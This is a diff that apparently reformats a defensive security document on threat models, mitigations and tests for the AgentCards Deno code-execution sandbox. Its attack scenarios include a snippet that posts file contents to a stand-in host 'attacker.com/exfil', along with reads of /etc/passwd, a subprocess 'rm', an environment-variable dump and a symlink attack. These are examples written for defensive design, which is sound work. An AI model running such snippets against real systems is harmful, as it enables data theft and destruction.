@@ -1,17 +1,17 @@
 # Sandboxing Security Best Practices
 
-**Date:** 2025-11-11
-**Owner:** Winston (Architect)
-**Status:** ✅ COMPLETE
-**Purpose:** Security guidelines and threat model for AgentCards code execution sandbox
+**Date:** 2025-11-11 **Owner:** Winston (Architect) **Status:** ✅ COMPLETE **Purpose:** Security
+guidelines and threat model for AgentCards code execution sandbox
 
 ---
 
 ## Executive Summary
 
-Executing untrusted code is **inherently dangerous**. This document provides security patterns, threat models, and mitigation strategies for AgentCards' Deno-based sandbox implementation.
+Executing untrusted code is **inherently dangerous**. This document provides security patterns,
+threat models, and mitigation strategies for AgentCards' Deno-based sandbox implementation.
 
 **Key Security Principles:**
+
 1. **Defense in Depth** - Multiple layers of security controls
 2. **Least Privilege** - Minimum permissions required for operation
 3. **Fail Secure** - Failures deny access, don't grant it
@@ -42,22 +42,26 @@ Executing untrusted code is **inherently dangerous**. This document provides sec
 ### Assets to Protect
 
 **1. Host System**
+
 - File system (credentials, secrets, source code)
 - Network resources
 - System processes
 - Environment variables (API keys, passwords)
 
 **2. User Data**
+
 - PII in code submissions
 - Intellectual property in prompts/code
 - Execution results
 
 **3. Service Availability**
+
 - CPU resources (DoS via infinite loops)
 - Memory resources (DoS via memory exhaustion)
 - Disk resources (DoS via disk exhaustion)
 
 **4. Other Users**
+
 - Isolation between concurrent executions
 - Privacy of execution results
 
@@ -66,21 +70,25 @@ Executing untrusted code is **inherently dangerous**. This document provides sec
 ### Threat Actors
 
 **1. Malicious User**
+
 - **Motivation:** Gain unauthorized access, steal data, disrupt service
 - **Capabilities:** Can submit arbitrary code
 - **Intent:** Intentionally hostile
 
 **2. Compromised User Account**
+
 - **Motivation:** Attacker using legitimate credentials
 - **Capabilities:** Same as legitimate user + attacker creativity
 - **Intent:** Intentionally hostile, appears legitimate
 
 **3. Buggy/Careless User**
+
 - **Motivation:** No malicious intent, just mistakes
 - **Capabilities:** Accidentally submits dangerous code
 - **Intent:** Unintentional harm
 
 **4. Curious User**
+
 - **Motivation:** "I wonder what happens if..."
 - **Capabilities:** Probing for vulnerabilities
 - **Intent:** Testing boundaries, may escalate if successful
@@ -92,6 +100,7 @@ Executing untrusted code is **inherently dangerous**. This document provides sec
 #### Scenario 1: File System Exfiltration
 
 **Attack:**
+
 ```typescript
 // User submits code to read sensitive files
 const secrets = await Deno.readTextFile("/etc/passwd");
@@ -104,6 +113,7 @@ return { secrets, apiKeys };
 **Likelihood:** HIGH (easy to attempt)
 
 **Mitigation:**
+
 - ✅ Deno `--deny-read` (except temp file)
 - ✅ File system isolation via permissions
 - ⚠️ Monitor permission violations
@@ -113,6 +123,7 @@ return { secrets, apiKeys };
 #### Scenario 2: Network Exfiltration
 
 **Attack:**
+
 ```typescript
 // User submits code to exfiltrate data over network
 const secrets = await Deno.readTextFile("/tmp/user-data.json");
@@ -127,6 +138,7 @@ await fetch("https://attacker.com/exfil", {
 **Likelihood:** HIGH (easy to attempt)
 
 **Mitigation:**
+
 - ✅ Deno `--deny-net`
 - ✅ Network isolation via permissions
 - ⚠️ Monitor network permission violations
@@ -136,6 +148,7 @@ await fetch("https://attacker.com/exfil", {
 #### Scenario 3: Subprocess Command Injection
 
 **Attack:**
+
 ```typescript
 // User submits code to spawn malicious subprocess
 const command = new Deno.Command("rm", {
@@ -149,6 +162,7 @@ await command.output();
 **Likelihood:** HIGH (easy to attempt)
 
 **Mitigation:**
+
 - ✅ Deno `--deny-run`
 - ✅ Subprocess spawning denied
 - ⚠️ Monitor subprocess permission violations
@@ -158,6 +172,7 @@ await command.output();
 #### Scenario 4: Denial of Service (CPU)
 
 **Attack:**
+
 ```typescript
 // Infinite loop consumes CPU
 while (true) {
@@ -171,6 +186,7 @@ while (true) {
 **Likelihood:** HIGH (easy to create accidentally)
 
 **Mitigation:**
+
 - ✅ Timeout enforcement (30s default)
 - ✅ Process isolation (kill doesn't affect host)
 - ⚠️ Consider rate limiting per user
@@ -180,6 +196,7 @@ while (true) {
 #### Scenario 5: Denial of Service (Memory)
 
 **Attack:**
+
 ```typescript
 // Memory exhaustion
 const data = [];
@@ -193,6 +210,7 @@ while (true) {
 **Likelihood:** HIGH (easy to create accidentally)
 
 **Mitigation:**
+
 - ✅ V8 memory limit (512MB default)
 - ✅ Process isolation (OOM doesn't affect host)
 - ⚠️ Consider per-user quotas
@@ -202,6 +220,7 @@ while (true) {
 #### Scenario 6: FFI / Native Code Execution
 
 **Attack:**
+
 ```typescript
 // Load malicious native library
 const lib = Deno.dlopen("/tmp/malicious.so", {
@@ -215,6 +234,7 @@ lib.symbols.exploit();
 **Likelihood:** LOW (requires compiling native code)
 
 **Mitigation:**
+
 - ✅ Deno `--deny-ffi`
 - ✅ FFI completely disabled
 - ⚠️ Monitor FFI permission violations (should never happen)
@@ -224,6 +244,7 @@ lib.symbols.exploit();
 #### Scenario 7: Environment Variable Exfiltration
 
 **Attack:**
+
 ```typescript
 // Steal environment variables (often contain secrets)
 const env = Deno.env.toObject();
@@ -235,6 +256,7 @@ return env; // Contains API keys, passwords, etc.
 **Likelihood:** HIGH (easy to attempt)
 
 **Mitigation:**
+
 - ✅ Deno `--deny-env`
 - ✅ Environment variable access denied
 - ⚠️ Monitor env permission violations
@@ -244,6 +266,7 @@ return env; // Contains API keys, passwords, etc.
 #### Scenario 8: Timing Attack / Side Channel
 
 **Attack:**
+
 ```typescript
 // Use high-resolution timers to leak information
 const start = performance.now();
@@ -261,6 +284,7 @@ if (duration > 100) {
 **Likelihood:** LOW (sophisticated attack)
 
 **Mitigation:**
+
 - ⚠️ Consider `--deny-hrtime` if processing sensitive data
 - ⚠️ Currently allow hrtime for performance measurement
 - ⚠️ Re-evaluate when handling PII
@@ -270,6 +294,7 @@ if (duration > 100) {
 #### Scenario 9: Temp File Race Condition
 
 **Attack:**
+
 ```typescript
 // Host creates temp file /tmp/abc123.ts
 // Attacker replaces it before execution
@@ -281,6 +306,7 @@ if (duration > 100) {
 **Likelihood:** LOW (requires precise timing, local access)
 
 **Mitigation:**
+
 - ✅ Temp files created with unique names
 - ✅ Atomic write operations
 - ⚠️ Use `Deno.makeTempFileSync()` (secure)
@@ -291,12 +317,13 @@ if (duration > 100) {
 #### Scenario 10: Resource Exhaustion (Disk)
 
 **Attack:**
+
 ```typescript
 // Fill disk with temp files (if write allowed)
 while (true) {
   await Deno.writeTextFile(
     `/tmp/file_${Math.random()}.txt`,
-    "A".repeat(1024 * 1024 * 100) // 100MB
+    "A".repeat(1024 * 1024 * 100), // 100MB
   );
 }
 ```
@@ -306,6 +333,7 @@ while (true) {
 **Likelihood:** LOW (write access denied in sandbox)
 
 **Mitigation:**
+
 - ✅ Deno `--deny-write`
 - ✅ No write access in sandbox
 - ⚠️ Monitor host disk usage (temp files)
@@ -321,12 +349,14 @@ while (true) {
 **Risk:** Vulnerabilities in Deno or V8 could bypass sandbox
 
 **Mitigations:**
+
 - ✅ Use latest stable Deno version
 - ✅ Subscribe to Deno security advisories
 - ✅ Update regularly (patch management)
 - ⚠️ Test updates in staging before production
 
 **Monitoring:**
+
 - Track Deno CVEs (https://github.com/denoland/deno/security/advisories)
 - Automated dependency scanning
 
@@ -339,12 +369,14 @@ while (true) {
 **Risk:** Permission bypass or misconfiguration
 
 **Mitigations:**
+
 - ✅ Explicit deny flags (defense-in-depth)
 - ✅ Minimal allow flags (only temp file read)
 - ✅ Permission verification tests
 - ⚠️ Regular security audits of permission config
 
 **Monitoring:**
+
 - Log all permission violation errors
 - Alert on unexpected permission patterns
 
@@ -357,6 +389,7 @@ while (true) {
 **Risk:** Message injection, command injection, privilege escalation
 
 **Mitigations:**
+
 - ✅ Input validation on all messages
 - ✅ Type checking (TypeScript)
 - ✅ Schema validation (Zod)
@@ -364,6 +397,7 @@ while (true) {
 - ⚠️ Authorization checks (which tools can user call?)
 
 **Monitoring:**
+
 - Log all MCP tool calls
 - Alert on suspicious patterns (rapid calls, failed auth)
 
@@ -376,12 +410,14 @@ while (true) {
 **Risk:** Prototype pollution, injection attacks
 
 **Mitigations:**
+
 - ✅ Use `JSON.stringify()` / `JSON.parse()` (safe)
 - ✅ Avoid `eval()` or `Function()` constructor
 - ⚠️ Size limits on serialized results (prevent DoS)
 - ⚠️ Sanitize error messages (no stack traces with host paths)
 
 **Monitoring:**
+
 - Track result sizes
 - Alert on suspiciously large results
 
@@ -394,6 +430,7 @@ while (true) {
 **Risk:** Race conditions, file disclosure, disk exhaustion
 
 **Mitigations:**
+
 - ✅ Use `Deno.makeTempFileSync()` (secure random names)
 - ✅ Cleanup in `finally` blocks
 - ✅ Atomic write operations
@@ -401,6 +438,7 @@ while (true) {
 - ⚠️ Disk quota monitoring
 
 **Monitoring:**
+
 - Track temp file creation/deletion
 - Alert on disk usage spikes
 
@@ -413,12 +451,14 @@ while (true) {
 **Risk:** PII disclosure, credential leakage in logs
 
 **Mitigations:**
+
 - ✅ PII detection before logging (Story 3.5)
 - ✅ Tokenize/redact sensitive data
 - ⚠️ Secure log storage (encryption, access control)
 - ⚠️ Log retention policies
 
 **Monitoring:**
+
 - Audit log access
 - Alert on sensitive data patterns in logs
 
@@ -429,23 +469,27 @@ while (true) {
 ### 1. Isolation Controls
 
 **1.1 Process Isolation**
+
 - ✅ Separate Deno subprocess per execution
 - ✅ No shared memory between executions
 - ✅ Process killed after timeout/completion
 - ✅ Independent permission contexts
 
 **1.2 File System Isolation**
+
 - ✅ Read access limited to single temp file
 - ✅ No write access
 - ✅ No access to home directories, /etc, /var, etc.
 
 **1.3 Network Isolation**
+
 - ✅ Complete network denial
 - ✅ No DNS resolution
 - ✅ No listening sockets
 - ✅ MCP tool calls via message passing (not direct network)
 
 **1.4 Resource Isolation**
+
 - ✅ CPU: Timeout enforcement (30s default)
 - ✅ Memory: V8 limit (512MB default)
 - ⚠️ Disk: Monitored via host process
@@ -455,11 +499,13 @@ while (true) {
 ### 2. Access Controls
 
 **2.1 Permission Model**
+
 - ✅ Whitelist-based (explicit allow)
 - ✅ Deny flags for critical permissions
 - ✅ `--no-prompt` (fail fast, no user interaction)
 
 **2.2 Capability-Based Security**
+
 - ✅ MCP tools exposed via capabilities (message passing)
 - ✅ Host validates tool access
 - ⚠️ Consider per-user tool allowlists
@@ -469,11 +515,13 @@ while (true) {
 ### 3. Input Validation
 
 **3.1 Code Input**
+
 - ⚠️ Syntax validation (TypeScript parser)
 - ⚠️ AST analysis for dangerous patterns
 - ⚠️ PII detection (Story 3.5)
 
 **3.2 Message Validation**
+
 - ✅ Schema validation for messages (Zod)
 - ✅ Type checking (TypeScript)
 - ⚠️ Size limits on messages
@@ -483,11 +531,13 @@ while (true) {
 ### 4. Output Sanitization
 
 **4.1 Result Serialization**
+
 - ✅ JSON serialization (safe)
 - ⚠️ Size limits on results
 - ⚠️ Remove internal paths from error messages
 
 **4.2 Error Handling**
+
 - ✅ Structured error types
 - ✅ Generic error messages for security violations
 - ⚠️ No stack traces with host file paths
@@ -497,11 +547,13 @@ while (true) {
 ### 5. Monitoring & Logging
 
 **5.1 Security Events**
+
 - ⚠️ Log all permission violations
 - ⚠️ Log all timeout/OOM kills
 - ⚠️ Log suspicious patterns
 
 **5.2 Metrics**
+
 - ⚠️ Execution count per user
 - ⚠️ Resource usage per execution
 - ⚠️ Error rates
@@ -589,6 +641,7 @@ while (true) {
 **Problem:** Accidentally granting too many permissions
 
 **Example:**
+
 ```typescript
 // ❌ BAD: Overly permissive
 new Deno.Command("deno", {
@@ -597,6 +650,7 @@ new Deno.Command("deno", {
 ```
 
 **Fix:**
+
 ```typescript
 // ✅ GOOD: Minimal permissions
 new Deno.Command("deno", {
@@ -608,7 +662,7 @@ new Deno.Command("deno", {
     "--deny-run",
     "--deny-ffi",
     "--deny-env",
-    "sandbox.ts"
+    "sandbox.ts",
   ],
 });
 ```
@@ -620,12 +674,14 @@ new Deno.Command("deno", {
 **Problem:** User escapes temp directory via `../`
 
 **Example:**
+
 ```typescript
 // User code attempts:
 await Deno.readTextFile("../../../../../etc/passwd");
 ```
 
-**Fix:** Deno normalizes paths before permission check. `/tmp/abc.ts/../../../../../etc/passwd` → `/etc/passwd`, which fails permission check. ✅ Already mitigated.
+**Fix:** Deno normalizes paths before permission check. `/tmp/abc.ts/../../../../../etc/passwd` →
+`/etc/passwd`, which fails permission check. ✅ Already mitigated.
 
 ---
 
@@ -634,6 +690,7 @@ await Deno.readTextFile("../../../../../etc/passwd");
 **Problem:** Attacker creates symlink in temp directory pointing to sensitive file
 
 **Example:**
+
 ```bash
 # Attacker pre-creates symlink
 ln -s /etc/passwd /tmp/abc123.ts
@@ -642,6 +699,7 @@ ln -s /etc/passwd /tmp/abc123.ts
 ```
 
 **Fix:**
+
 - Use `Deno.makeTempFileSync()` with unique names (collision unlikely)
 - Set restrictive permissions on temp directory (750)
 - ⚠️ Consider using `Deno.realPathSync()` to resolve symlinks
@@ -653,6 +711,7 @@ ln -s /etc/passwd /tmp/abc123.ts
 **Problem:** File contents change between validation and execution
 
 **Example:**
+
 ```typescript
 // Host validates code
 const code = await Deno.readTextFile(tempFile);
@@ -665,6 +724,7 @@ const result = await executeSandbox(tempFile);
 ```
 
 **Fix:**
+
 - Write code, then immediately execute
 - Don't read file multiple times
 - Use atomic operations
@@ -677,6 +737,7 @@ const result = await executeSandbox(tempFile);
 **Problem:** Many concurrent executions exhaust host resources
 
 **Example:**
+
 ```typescript
 // 100 users submit code simultaneously
 // Each spawns subprocess
@@ -684,6 +745,7 @@ const result = await executeSandbox(tempFile);
 ```
 
 **Fix:**
+
 - ⚠️ Rate limiting per user
 - ⚠️ Global concurrency limit
 - ⚠️ Queue system for execution requests
@@ -696,12 +758,14 @@ const result = await executeSandbox(tempFile);
 **Problem:** Error messages reveal internal paths, secrets
 
 **Example:**
+
 ```typescript
 // Error exposes host file system structure
 Error: Cannot read file: /home/agentcards/src/gateway/api-key.ts
 ```
 
 **Fix:**
+
 ```typescript
 // ✅ Sanitize error messages
 function sanitizeError(error: Error): Error {
@@ -718,17 +782,19 @@ function sanitizeError(error: Error): Error {
 **Problem:** User creates loop that appears to make progress but never completes
 
 **Example:**
+
 ```typescript
 // Not a tight loop - makes system calls
 let i = 0;
 while (true) {
-  await new Promise(resolve => setTimeout(resolve, 1));
+  await new Promise((resolve) => setTimeout(resolve, 1));
   i++;
   if (i % 1000 === 0) console.log(i); // Appears to progress
 }
 ```
 
 **Fix:**
+
 - ✅ Timeout enforced regardless of "progress"
 - ✅ Timeout kills process after 30s
 - No bypass possible
@@ -740,6 +806,7 @@ while (true) {
 **Problem:** Attacker pollutes `Object.prototype` to affect host
 
 **Example:**
+
 ```typescript
 // Sandbox code
 Object.prototype.polluted = "malicious";
@@ -748,6 +815,7 @@ Object.prototype.polluted = "malicious";
 ```
 
 **Fix:**
+
 - ✅ Process isolation prevents prototype pollution from affecting host
 - Sandbox and host run in separate V8 isolates
 - No shared state
@@ -761,20 +829,21 @@ Object.prototype.polluted = "malicious";
 **Principle:** Default configuration should be secure
 
 **Implementation:**
+
 ```typescript
 export class DenoSandboxExecutor {
   constructor(config?: SandboxConfig) {
     this.config = {
       // Secure defaults
-      timeout: 30000,        // 30s max
-      memoryLimit: 512,      // 512MB max
-      allowedReadPaths: [],  // No extra read access
-      denyNetwork: true,     // Always deny network
-      denyWrite: true,       // Always deny write
-      denyRun: true,         // Always deny subprocess
-      denyFfi: true,         // Always deny FFI
-      denyEnv: true,         // Always deny env
-      ...config,             // User overrides (but denies can't be overridden)
+      timeout: 30000, // 30s max
+      memoryLimit: 512, // 512MB max
+      allowedReadPaths: [], // No extra read access
+      denyNetwork: true, // Always deny network
+      denyWrite: true, // Always deny write
+      denyRun: true, // Always deny subprocess
+      denyFfi: true, // Always deny FFI
+      denyEnv: true, // Always deny env
+      ...config, // User overrides (but denies can't be overridden)
     };
   }
 }
@@ -787,6 +856,7 @@ export class DenoSandboxExecutor {
 **Principle:** Failures should deny access, not grant it
 
 **Implementation:**
+
 ```typescript
 try {
   const result = await executeSandbox(code);
@@ -807,6 +877,7 @@ try {
 **Principle:** Grant minimum permissions required
 
 **Implementation:**
+
 ```typescript
 // ✅ Only allow reading temp file
 --allow-read=/tmp/abc123.ts
@@ -822,6 +893,7 @@ try {
 **Principle:** Validate all inputs before processing
 
 **Implementation:**
+
 ```typescript
 export function validateCodeInput(code: string): ValidationResult {
   // Size limit
@@ -854,17 +926,18 @@ export function validateCodeInput(code: string): ValidationResult {
 **Principle:** Sanitize all outputs before returning
 
 **Implementation:**
+
 ```typescript
 function sanitizeResult(result: ExecutionResult): ExecutionResult {
   // Remove internal paths from errors
   if (result.error) {
     result.error.message = sanitizeErrorMessage(result.error.message);
-    result.error.stack = undefined;  // No stack traces
+    result.error.stack = undefined; // No stack traces
   }
 
   // Limit result size
   const serialized = JSON.stringify(result);
-  if (serialized.length > 1_000_000) {  // 1MB limit
+  if (serialized.length > 1_000_000) { // 1MB limit
     return {
       success: false,
       error: { type: "RuntimeError", message: "Result too large" },
@@ -882,6 +955,7 @@ function sanitizeResult(result: ExecutionResult): ExecutionResult {
 **Principle:** Multiple layers of security controls
 
 **Implementation:**
+
 - Layer 1: Deno permissions (runtime enforcement)
 - Layer 2: Process isolation (OS enforcement)
 - Layer 3: Resource limits (V8 + host enforcement)
@@ -896,6 +970,7 @@ function sanitizeResult(result: ExecutionResult): ExecutionResult {
 **Principle:** Detect and respond to security events
 
 **Implementation:**
+
 ```typescript
 function logSecurityEvent(event: SecurityEvent) {
   // Log to secure audit log
@@ -927,6 +1002,7 @@ function logSecurityEvent(event: SecurityEvent) {
 **Purpose:** Verify permissions are enforced
 
 **Tests:**
+
 ```typescript
 // Test filesystem access denied
 Deno.test("Sandbox denies /etc/passwd read", async () => {
@@ -969,6 +1045,7 @@ Deno.test("Sandbox denies subprocess", async () => {
 **Purpose:** Verify resource limits enforced
 
 **Tests:**
+
 ```typescript
 // Test timeout enforcement
 Deno.test("Sandbox enforces timeout", async () => {
@@ -1007,6 +1084,7 @@ Deno.test("Sandbox enforces memory limit", async () => {
 **Purpose:** Verify input validation works
 
 **Tests:**
+
 ```typescript
 // Test command injection (via MCP bridge)
 Deno.test("Message bridge prevents command injection", async () => {
@@ -1030,6 +1108,7 @@ Deno.test("Message bridge prevents command injection", async () => {
 **Purpose:** Simulate real attacks
 
 **Scenarios:**
+
 1. Attempt to read `/etc/passwd`, `/home/user/.bashrc`, `.env` files
 2. Attempt to exfiltrate data over network
 3. Attempt to spawn reverse shell
@@ -1048,6 +1127,7 @@ Deno.test("Message bridge prevents command injection", async () => {
 ### Detection
 
 **Security Events to Monitor:**
+
 - Permission violation errors (read, write, net, run, ffi, env)
 - Timeout kills
 - OOM kills
@@ -1060,30 +1140,36 @@ Deno.test("Message bridge prevents command injection", async () => {
 ### Response Plan
 
 **1. Detect**
+
 - Security monitoring dashboard
 - Automated alerts on suspicious patterns
 
 **2. Triage**
+
 - Severity: Critical, High, Medium, Low
 - Impact: Data breach, DoS, Privilege escalation
 - Affected users: Single user, multiple users, all users
 
 **3. Contain**
+
 - Rate limit affected user
 - Temporarily disable execute_code tool if necessary
 - Kill running sandboxes
 
 **4. Investigate**
+
 - Review audit logs
 - Analyze attack code
 - Determine root cause
 
 **5. Remediate**
+
 - Patch vulnerability
 - Update permissions/limits
 - Deploy fix
 
 **6. Communicate**
+
 - Notify affected users (if data breach)
 - Post-mortem document
 - Security advisory (if applicable)
@@ -1189,14 +1275,17 @@ Deno.test("Message bridge prevents command injection", async () => {
 ## References
 
 **Deno Security:**
+
 - [Deno Security Model](https://deno.land/manual/runtime/security)
 - [Deno Security Advisories](https://github.com/denoland/deno/security/advisories)
 
 **Sandboxing Best Practices:**
+
 - [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
 - [Google's Sandboxing Guide](https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md)
 
 **AgentCards Documentation:**
+
 - [Deno Permissions Deep Dive](./deno-permissions-deep-dive.md)
 - [Deno Sandbox POC Summary](./deno-sandbox-poc-summary.md)
 - [Architecture Spike - MCP Tools Injection](./architecture-spike-mcp-tools-injection.md)
@@ -1205,9 +1294,11 @@ Deno.test("Message bridge prevents command injection", async () => {
 
 ## Conclusion
 
-Sandboxing untrusted code is **inherently risky**, but with proper controls, AgentCards can execute user code securely.
+Sandboxing untrusted code is **inherently risky**, but with proper controls, AgentCards can execute
+user code securely.
 
 **Key Takeaways:**
+
 1. **Defense in Depth** - Multiple security layers
 2. **Least Privilege** - Minimal permissions
 3. **Fail Secure** - Failures deny access
@@ -1215,11 +1306,13 @@ Sandboxing untrusted code is **inherently risky**, but with proper controls, Age
 5. **Regular Updates** - Patch management critical
 
 **Risk Acceptance:**
+
 - Some risk is unavoidable when executing untrusted code
 - Mitigations reduce risk to acceptable levels
 - Continuous monitoring and improvement required
 
 **Next Steps:**
+
 - Implement security controls in Story 3.1
 - Add PII detection in Story 3.5
 - Comprehensive security tests in Story 3.7
@@ -1227,6 +1320,4 @@ Sandboxing untrusted code is **inherently risky**, but with proper controls, Age
 
 ---
 
-**Document Status:** ✅ COMPLETE
-**Date:** 2025-11-11
-**Owner:** Winston (Architect)
+**Document Status:** ✅ COMPLETE **Date:** 2025-11-11 **Owner:** Winston (Architect)
